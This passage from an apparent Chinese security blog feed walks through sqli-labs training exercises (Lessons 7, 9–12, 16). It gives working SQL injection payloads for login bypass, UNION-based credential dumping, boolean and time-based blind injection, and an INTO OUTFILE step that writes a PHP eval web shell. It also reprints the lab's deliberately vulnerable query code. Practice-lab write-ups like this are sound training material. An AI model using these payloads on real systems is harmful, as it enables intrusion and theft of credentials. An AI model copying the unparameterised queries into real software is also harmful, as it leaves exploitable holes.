class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="comment">//echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">      <span class="comment">//print_r(mysql_error());</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h3><p>基于 bool 型 / 时间延迟的双引号 POST 型盲注</p><h4 id="判断数据类型-3"><a href="#判断数据类型-3" class="headerlink" title="判断数据类型"></a>判断数据类型</h4><p>用户名随便写点东西后用单引号闭合，使用 OR 运算符构造恒真条件，使用 “#” 注释掉后面的内容注入。网页提示登录失败，但是并未返回任何信息。注入以下的内容，统统提示登录失败。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; OR 1 = 1#</span><br><span class="line">a&#x27;) OR 1 = 1#</span><br><span class="line">a&#x27;)) OR 1 = 1#</span><br><span class="line">a&quot; OR 1 = 1#</span><br></pre></td></tr></table></figure><p>注入双引号和括号，网页提示登录成功。此处只能通过登录成功或失败来判断注入情况，使用 bool 盲注或者时间盲注都行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;) OR 1 = 1#</span><br></pre></td></tr></table></figure><p>使用 Brup 抓包，网页是通过 POST 方法提交的参数如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="获取数据库信息-3"><a href="#获取数据库信息-3" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h4><p>通关 Less 16 采用上述两种方式都行，也可以使用时间盲注。判断表有几列，使用 ORDER BY 子句对第二列对返回的结果排序，网页返回正常。对第 3 列对返回的结果排序，网页返回不知道第 3 列，说明一共有 2 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&quot;) OR 1 = 1 ORDER BY 2#&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>判断数据库名的长度，使用 length() 函数得出数据库长度为 8。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&quot;) OR LENGTH((SELECT database())) = 8#&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>获取数据库名，使用 substr() 函数截取数据库名的每个字符，然后使用 ASCII() 函数判断这个字符的 ASCII 码值。使用二分法进行测试，最后得出数据库名的第一个字符 ASCII 码值为 115。通过相同的方式进行测试，最后得出数据库名为 “security”。使用同样的方法继续爆出表名、字段名及其剩余信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&quot;) OR ASCII(SUBSTR((SELECT database()),1,1))=115#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="关卡SQL查询语句-3"><a href="#关卡SQL查询语句-3" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// connectivity</span><br><span class="line">$uname = &#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd = &#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; </span><br><span class="line">@$sql = &quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs：Less 11 12</title>
      <link href="/posts/Less%2011%2012(%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E6%B3%A8%E5%85%A5)/"/>
      <url>/posts/Less%2011%2012(%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E6%B3%A8%E5%85%A5)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sqli-labs：Less-11-12"><a href="#sqli-labs：Less-11-12" class="headerlink" title="sqli-labs：Less 11 12"></a>sqli-labs：Less 11 12</h1><p>Less 11 和 12 网页都提供了一个登陆界面，注入的基本思想和步骤与 Less 1 ~ 4 相同，这里需要使用 POST 方法提交参数。</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less 11"></a>Less 11</h2><p>基于错误的POST型单引号字符型注入</p><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>首先尝试下这个网页的正常用法，输入一个正确的用户名和密码试试，网页显示登陆成功。</p><p>接下来直接在 “Username” 中直接注入单引号，网页返回报错信息，说明存在 Sql 注入。</p><p>注入万能密码试试，用户名随便写点东西，使用 OR 运算符构造恒真条件，使用 “#” 注释掉后面的内容注入。网页提示我们注入成功，由于此处使用的是单引号闭合，因此这里是字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; or 1 = 1#</span><br></pre></td></tr></table></figure><p>使用hackbar加载，看到网页是通过 POST 方法提交参数，提交的参数如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408141629679.png" alt="image-20240814162907403"></p><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>判断表有几列，使用 ORDER BY 子句进行排序看下对几列有效。输入2时对返回的结果排序，网页返回正常，输入3时报错，说明一共有 2 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&#x27; or 1 = 1 order by 2#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>爆数据库名，首先注入错误的用户名和密码，使其找不到数据。使用 UNION 进行联合查询，查询成功把数据库名接到网页回显的地方。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&amp;passwd=a&#x27; union select database(),1#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408141636302.png" alt="image-20240814163605196"></p><p>爆表名，使用联合查询在 “information_schema.tables” 中查询表名，表名来自 “security” 数据库。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd=1&amp;submit=Submit&amp;uname=a&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408141640524.png" alt="image-20240814164026547"></p><p>爆字段名，使用联合查询在 “information_schema.columns” 中查询表名，字段名来自 “security” 数据库的 “users” 表。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd=1&amp;submit=Submit&amp;uname=a&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408141643983.png" alt="image-20240814164331007"></p><h3 id="获取目标信息"><a href="#获取目标信息" class="headerlink" title="获取目标信息"></a>获取目标信息</h3><p>接下来爆出 users 表中的用户名和密码，构造出 payload 如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd=1&amp;submit=Submit&amp;uname=a&#x27; union select 1,group_concat(concat_ws(&#x27;:&#x27;,username,password)) from security.users#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408141652879.png" alt="image-20240814165221059"></p><h3 id="关卡SQL查询语句"><a href="#关卡SQL查询语句" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span> = <span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;</span></span><br><span class="line">  </span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//echo &quot; You Have successfully logged in\n\n &quot; ;</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less 12"></a>Less 12</h2><p>基于错误的双引号 POST 型字符型变形的注入</p><h3 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>通过常规测试，可知网页存在字符型注入漏洞，并且使用双引号和括号进行闭合。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&quot;) or 1 = 1#</span><br></pre></td></tr></table></figure><h3 id="获取数据库信息-1"><a href="#获取数据库信息-1" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>Less 12 仅对字符的闭合方式不同于 Less 11，注入的方式完全相同。</p><h3 id="获取目标信息-1"><a href="#获取目标信息-1" class="headerlink" title="获取目标信息"></a>获取目标信息</h3><p>同Less11</p><h3 id="关卡SQL查询语句-1"><a href="#关卡SQL查询语句-1" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$uname = &#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd = &#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; </span><br><span class="line">@$sql = &quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs：Less 9 10</title>
      <link href="/posts/Less%209%2010(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/"/>
      <url>/posts/Less%209%2010(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sqli-labs：Less-9-10"><a href="#sqli-labs：Less-9-10" class="headerlink" title="sqli-labs：Less 9 10"></a>sqli-labs：Less 9 10</h1><p>Less 9 和 Less 10 都是时间盲注，主要思想是利用 IF 语句，结合 sleep() 函数制造时间差来判断注入的正确性。</p><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h2><p>基于时间的 GET 单引号盲注</p><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>首先注入正确的参数，网页返回 “You are in…”，但是没有其他信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>接下来注入个查不到的参数，网页还是返回 “You are in…”。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1</span><br></pre></td></tr></table></figure><p>以下4中注入，网页还是返回 “You are in…”，说明此时网页不会回显任何有价值的信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&#x27;--+</span><br><span class="line">?id=1&quot;</span><br><span class="line">?id=1&quot;--+</span><br></pre></td></tr></table></figure><p>转换思路，MySQL的 <code>sleep()</code> 函数能够起到休眠的作用。为了方便调试这里使用bp的重发器，注入如下参数响应时间没有异常。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and sleep(2)--+</span><br></pre></td></tr></table></figure><p>注入如下参数响应时间明显增加，并且主观上也能感受到延迟。这是明显的基于 <strong>时间盲注</strong> 的字符型SQL注入漏洞，我们需要使用 <code>sleep()</code> 函数制造时间差进行注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and sleep(2)--+</span><br></pre></td></tr></table></figure><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>注入流程与 Less 5 类似，不过这里的判断标准不是会显的信息，而是响应时间。MySQL 的 IF 语句允许根据表达式的某个条件或值结果来执行一组 SQL 语句，语法如下，当表达式 expr 为真时返回 value1 的值，否则返回 value2。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(expr, value1, value2)</span><br></pre></td></tr></table></figure><p>此处因为无法回显任何东西，因此<code>order by</code>子句失效。我们使用if语句结合 <code>length()</code> 函数对数据库名长度进行判断，如果猜测正确则令响应时间长一些。猜测数据库名长度小于 10 时响应时间超过，所以数据库名长度小于 10。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())&lt;10,sleep(1),1)--+</span><br></pre></td></tr></table></figure><p>经过二分法测试，得出数据库长度为 8。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())=8,sleep(1),1)--+</span><br></pre></td></tr></table></figure><p>使用 left() 函数判断数据库名的第一位是否是字符 a，注入之后响应很快说明数据库名第一位不是 a。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(left((select database()), 1)=&#x27;a&#x27;,sleep(1),1)--+</span><br></pre></td></tr></table></figure><p>使用穷举法进行测试，得出数据库名的第一个字符为 “s”。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(left((select database()), 1)=&#x27;s&#x27;,sleep(1),1)--+</span><br></pre></td></tr></table></figure><p>接下来得出数据库名，再使用同样的方法继续爆破表名、字段名及其剩余信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(left((select database()), 8)=&#x27;security&#x27;,sleep(1),1)--+</span><br></pre></td></tr></table></figure><h3 id="关卡SQL查询语句"><a href="#关卡SQL查询语句" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      echo &#x27;You are in...........&#x27;;</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      echo &#x27;You are in...........&#x27;;</span><br><span class="line">      //print_r(mysql_error());</span><br><span class="line">      //echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">      echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less 10"></a>Less 10</h2><p>基于时间的双引号盲注</p><h3 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>首先注入正确的参数，网页返回 “You are in…”，但是没有其他信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>以下 5 种注入都是还是返回 “You are in…”，说明此时网页不会回显任何有价值的信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1</span><br><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&#x27;--+</span><br><span class="line">?id=1&quot;</span><br><span class="line">?id=1&quot;--+</span><br></pre></td></tr></table></figure><p>为了方便调试这里使用 brup 的重发器，注入以下 2 种参数响应时间没有异常。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and sleep(1)--+</span><br><span class="line">?id=1&#x27; and sleep(1)--+</span><br></pre></td></tr></table></figure><p>使用双引号闭合时，响应时间明显增加，并且主观上也能感受到延迟，这是基于 <strong>时间盲注</strong> 的字符型 Sql 注入漏洞。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and sleep(1)--+</span><br></pre></td></tr></table></figure><h3 id="获取数据库信息-1"><a href="#获取数据库信息-1" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>Less 10 和 Less 9 差不多，只是 Less 10使用双引号进行闭合。此处因为无法回显任何东西，因此 order by子句失效。使用 if 语句结合 length() 函数进行诸如，猜测数据库名长度小于 10 时响应时间超过 1 秒。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&lt;10,sleep(1),1)--+</span><br></pre></td></tr></table></figure><p>经过二分法测试，得出数据库长度为 8。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())=8,sleep(1),1)--+</span><br></pre></td></tr></table></figure><p>获取数据库名时，使用 <code>left()</code> 函数进行穷举法的效率较低，使用 <code>substr()</code> 函数结合 ASCII() 函数进行判断可以使用二分法快速缩小范围。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(ascii(substr((select database()),1,1))&gt;109,sleep(1),1)--+</span><br></pre></td></tr></table></figure><p>使用二分法进行测试，最后得出数据库名的第一个字符 ASCII 码值为 115。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(ascii(substr((select database()),1,1))=115,sleep(1),1)--+</span><br></pre></td></tr></table></figure><p>使用相同方法依次得出剩下的字符 ASCII 码值，连接在一起就是数据库名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(ascii(substr((select database()),2,1))=102,sleep(1),1)--+</span><br></pre></td></tr></table></figure><h3 id="关卡SQL查询语句-1"><a href="#关卡SQL查询语句-1" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      echo &#x27;You are in...........&#x27;;</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      echo &#x27;You are in...........&#x27;;</span><br><span class="line">      //print_r(mysql_error());</span><br><span class="line">      //echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">      echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs：Less 7</title>
      <link href="/posts/Less%207(%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5)/"/>
      <url>/posts/Less%207(%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sqli-labs：Less-7"><a href="#sqli-labs：Less-7" class="headerlink" title="sqli-labs：Less 7"></a>sqli-labs：Less 7</h2><h3 id="开启文件读写权限"><a href="#开启文件读写权限" class="headerlink" title="开启文件读写权限"></a>开启文件读写权限</h3><p>MySQL使用 <code>secure-file-priv</code> 参数对文件读写进行限制，当参数值为 null 时无法进行文件导出操作。使用这条命令可以查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408201031386.png" alt="image-20240820103117502"></p><p>通过修改 MySQL 下的 my.ini 配置文件就可以启用权限，需要把下面这个字符串写入文件中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secure_file_priv=&quot;/&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408201014024.png" alt="img"></p><p>再次查看此参数，若参数值不为 null 则修改成功。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408201031022.png" alt="image-20240820103137039"></p><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>注入个正常的参数，网页返回 “You are in…. Use outfile……”。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>注入单引号和单引号加个括号闭合，网页回显错误信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; --+</span><br><span class="line">?id=1&#x27;) --+</span><br></pre></td></tr></table></figure><p>注入单引号再加上 2 个括号闭合，网页回显 “You are in…. Use outfile……”，说明这是用一个单引号和 2 个括号闭合的字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) --+</span><br></pre></td></tr></table></figure><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>我们需要先知道网页所在的文件路径，从 Less 7 是没办法得知的，所以我们转去 Less 1 获取文件路径。这种操作也可以应用在实践中，可以同时利用同一 Web 中的多个注入点。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=9999&#x27; union select 1,@@basedir,@@datadir --+</span><br><span class="line">#@@datadir获取数据库存储数据路径 ，@@basedir是MYSQL获取安装路径</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408201032663.png" alt="image-20240820103238744"></p><p>使用 union联合查询来注入参数，使用 into outfile 在网页目录下写入一句话木马。注意此处存在转义的问题，所有的 “\” 都要双写。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) UNION SELECT 1,2,&#x27;&lt;?php @eval($_POST[&quot;attack&quot;]);?&gt;&#x27; into outfile &quot;D:\\PHP\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\text.php&quot;--+</span><br></pre></td></tr></table></figure><p>虽然网页显示错误，但是打开文件发现成功写入。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408201040348.png" alt="image-20240820104045240"></p><h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><p>使用蚁剑连接，记得 url 要加上我们传入的 text.php。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408201041226.png" alt="image-20240820104158291"></p><p>连接成功，现在可以随意操作网页所在主机的文件了。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408201042237.png" alt="image-20240820104235204"></p><h3 id="关卡-SQL-查询语句"><a href="#关卡-SQL-查询语句" class="headerlink" title="关卡 SQL 查询语句"></a>关卡 SQL 查询语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span 